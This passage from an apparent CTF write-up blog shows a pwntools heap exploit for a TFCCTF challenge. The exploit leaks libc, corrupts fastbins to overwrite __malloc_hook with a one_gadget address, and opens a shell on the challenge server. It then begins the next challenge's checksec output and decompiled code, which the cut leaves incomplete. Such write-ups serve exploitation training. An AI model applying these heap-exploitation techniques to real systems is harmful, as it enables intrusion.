data-num=\"2\"></td><td><pre>huan_attack_pwn</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># from LibcSearcher import *</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># from ctypes import *</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># context(arch='i386' , os='linux', log_level='debug')</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>binary <span class=\"token operator\">=</span> <span class=\"token string\">'./chall'</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>libc <span class=\"token operator\">=</span> <span class=\"token string\">'./libc.so.6'</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>host<span class=\"token punctuation\">,</span> port <span class=\"token operator\">=</span> <span class=\"token string\">\"challs.tfcctf.com:30956\"</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\033[31;40mremote\\033[0m: (y)\\n'</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token string\">'\\033[32;40mprocess\\033[0m: (n)'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">if</span> sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">'y'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    r <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\"># r = gdb.debug(binary)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\"># libc = cdll.LoadLibrary(libc)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># srand = libc.srand (libc.time (0)) #设置种子</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>default <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>                <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> time<span class=\"token operator\">=</span>default             <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>rpu     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">,</span>drop<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>lic     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> length                   <span class=\"token punctuation\">:</span> <span class=\"token string\">b'Yhuan'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">//</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'Y'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>lg      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name                 <span class=\"token punctuation\">:</span> log<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>var_name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> ：0x</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token builtin\">globals</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>var_name<span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span><span class=\"token format-spec\">x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>prl     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name                 <span class=\"token punctuation\">:</span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>var_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>debug   <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> command<span class=\"token operator\">=</span><span class=\"token string\">''</span>               <span class=\"token punctuation\">:</span> gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">,</span>command<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                          <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">menu</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">'Input: '</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">,</span>password<span class=\"token punctuation\">,</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>\tmenu<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">'Select length: '</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>\tsa<span class=\"token punctuation\">(</span><span class=\"token string\">'Enter credentials: '</span><span class=\"token punctuation\">,</span>password<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>\tsa<span class=\"token punctuation\">(</span><span class=\"token string\">'Name of the credentials: '</span><span class=\"token punctuation\">,</span>name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>\tmenu<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">dele</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>\tmenu<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">\"Select index: \"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre><span class=\"token comment\"># add(0x18,b'a',b'b')</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'b'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x48</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'aaaa'</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'bbbb'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'b'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'b'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'b'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x28</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'b'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre></pre></td></tr><tr><td data-num=\"71\"></td><td><pre></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>pl <span class=\"token operator\">=</span> padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'\\x91'</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span>pl<span class=\"token punctuation\">,</span><span class=\"token string\">b'b'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'deadbeef'</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'b'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>show<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">b'deadbeef'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>libcbase <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">96</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span> <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x80</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'libcbase'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>malloc_hook <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> libcbase</pre></td></tr><tr><td data-num=\"82\"></td><td><pre>og <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0x42e69</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x42e7a</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x6f821</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x6f82f</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x6f834</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xc4dbf</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xc4ddf</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xc4de6</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xe1fa1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xe1fad</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>ogg <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> og<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>memalign_hook_ <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'memalign_hook_ini'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> libcbase</pre></td></tr><tr><td data-num=\"85\"></td><td><pre>realloc_hook_ini <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'realloc_hook_ini'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> libcbase</pre></td></tr><tr><td data-num=\"86\"></td><td><pre></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>pl <span class=\"token operator\">=</span> padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x41</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x71</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>pl<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> pl <span class=\"token punctuation\">,</span><span class=\"token string\">'b'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>pl <span class=\"token operator\">=</span> padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x71</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>malloc_hook<span class=\"token operator\">-</span><span class=\"token number\">0x23</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> pl<span class=\"token punctuation\">,</span> <span class=\"token string\">'b'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x68</span><span class=\"token punctuation\">,</span><span class=\"token string\">'b'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'b'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>pl <span class=\"token operator\">=</span> p8<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>memalign_hook_<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>ogg<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>ogg<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x68</span><span class=\"token punctuation\">,</span>pl<span class=\"token punctuation\">,</span><span class=\"token string\">'b'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre><span class=\"token comment\"># # pause()</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre><span class=\"token comment\"># # dele(2)</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre><span class=\"token comment\"># debug()</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>menu<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Select length: '</span><span class=\"token punctuation\">,</span><span class=\"token string\">'32'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre><span class=\"token comment\"># sla('Enter credentials: ','a')</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"mcback2dabasics\"><a class=\"markdownIt-Anchor\" href=\"#mcback2dabasics\">#</a> MCBACK2DABASICS</h3>\n<p>491 points\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tPWN</p>\n<p>Mcsky23 10 solves\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t MEDIUM</p>\n<blockquote>\n<p>Back 2 the chunks back 2 the muney back 2 the writes I don’t listen 2 u when u corrupted cause u just talkin out of bytes You’ll clear some certain bins just to see us overwrite…</p>\n</blockquote>\n<pre><code>[*] '/home/yhuan/Desktop/chall/mcback2dabasics/handout/chall1'\n    Arch:     amd64-64-little\n    RELRO:    Full RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\n    RUNPATH:  b'/home/yhuan/glibc-all-in-one/libs/2.24-3ubuntu1_amd64'\n</code></pre>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> __fastcall __noreturn <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a1<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>a2<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>a3<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> v3<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+0h] [rbp-10h] BYREF</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+4h] [rbp-Ch]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> __int64 v5<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+8h] [rbp-8h]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  v5 <span class=\"token operator\">=</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">setvbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdin</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token function\">setvbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdout</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token function\">setvbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;=</span> <span class=\"token number\">63</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    qword_202060<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>      <span class=\"token function\">meau</span><span class=\"token 